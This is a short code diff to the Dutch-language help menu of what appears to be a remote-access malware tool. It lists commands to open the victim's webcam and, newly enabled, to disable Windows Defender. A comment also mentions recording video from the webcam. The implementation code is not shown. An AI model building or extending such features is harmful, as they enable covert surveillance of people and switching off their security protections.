@@ -29,10 +29,10 @@ def get_command_list() -> str:
     """
     return r"""
 Command Lijst:
-/banner        -   ASCII art banner
-/webcam      -   opent de webcam
+/banner         -   ASCII art banner
+/webcam         -   opent de webcam
+/stopdefender   -   Windows Defender uitgeschakelen
 """
-# /stopdefender   -   Windows Defender uitgeschakelen
 
 
 # maak een video recording met de webcam
